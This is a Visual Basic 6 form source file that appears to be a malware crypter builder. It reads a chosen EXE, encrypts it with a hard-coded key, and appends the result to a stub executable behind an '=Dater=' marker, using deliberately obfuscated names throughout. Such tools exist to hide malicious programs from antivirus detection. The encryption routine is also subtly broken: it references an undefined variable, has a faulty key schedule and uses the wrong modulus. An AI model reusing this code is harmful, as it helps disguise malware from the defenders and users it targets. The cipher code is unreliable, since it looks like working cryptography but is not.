VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "Comdlg32.ocx"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3105
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4800
   LinkTopic       =   "Form1"
   Picture         =   "Form1.frx":0000
   ScaleHeight     =   3105
   ScaleWidth      =   4800
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog po0990g1 
      Left            =   360
      Top             =   2160
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton kiop09 
      Caption         =   "crypt"
      Height          =   255
      Left            =   3600
      TabIndex        =   2
      Top             =   1200
      Width           =   1095
   End
   Begin VB.CommandButton bhyu89o 
      Caption         =   "Browse"
      Height          =   375
      Left            =   3600
      TabIndex        =   1
      Top             =   720
      Width           =   1095
   End
   Begin VB.TextBox fghy 
      Height          =   375
      Left            =   480
      TabIndex        =   0
      Top             =   240
      Width           =   3375
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub bhyu89o_Click()
With po0990g1
        .DialogTitle = "Choose file"
        .Filter = "EXE Files |*.exe"
        .ShowOpen
End With

If Not po0990g1.FileName = vbNullString Then

fghy.Text = po0990g1.FileName

End If
End Sub
Public Function bnmuiytruio(ByVal yuitrdsasfgg As String, ByVal fdasjophfvxz As String) As String
On Error Resume Next
Dim rewazxcasw(0 To 255) As Integer, lopygvcxasf, vbasqwtyjhg As Long, bvnmkhfaswe() As Byte
bvnmkhfaswe = StrConv(fdasjophfvxz, vbFromUnicode)
For lopygvcxasf = 0 To 255
vbasqwtyjhg = (vbasqwtyjhg + rewazxcasw(lopygvcxasf) + bvnmkhfaswe(lopygvcxasf Mod Len(fdasjophfvxz))) Mod 256
rewazxcasw(lopygvcxasf) = lopygvcxasf
Next lopygvcxasf
bvnmkhfaswe() = StrConv(yuitrdsasfgg, vbFromUnicode)
For lopygvcxasf = 0 To Len(yuitrdsasfgg)
vbasqwtyjhg = (vbasqwtyjhg + rewazxcasw(vbasqwtyjhg) + 1) Mod 256
bvnmkhfaswe(lopygvcxasf) = bvnmkhfaswe(lopygvcxasf) Xor rewazxcasw(Temp + rewazxcasw((vbasqwtyjhg + rewazxcasw(vbasqwtyjhg)) Mod 254))
Next lopygvcxasf
bnmuiytruio = StrConv(bvnmkhfaswe, vbUnicode)
End Function



Private Sub Form_Load()

End Sub

Private Sub kiop09_Click()
Dim koilayeral As String



Open App.Path & "\koilayeral.exe" For Binary As #1
koilayeral = Space(LOF(1))
Get #1, , koilayeral
Close #1

With po0990g1

        .DialogTitle = "Save File Destination"
        .Filter = "EXE Files |*.exe"
        .ShowSave

End With


Dim neropluas As String

Open fghy.Text For Binary As #1
neropluas = Space(LOF(1))
Get #1, , neropluas
Close #1




neropluas = bnmuiytruio(neropluas, "uiopqwersacvbaopqw34")

Open po0990g1.FileName For Binary As #1
Put #1, , koilayeral & "=Dater=" & neropluas
Close #1

MsgBox "File Done", vbInformation, Me.Caption
End Sub

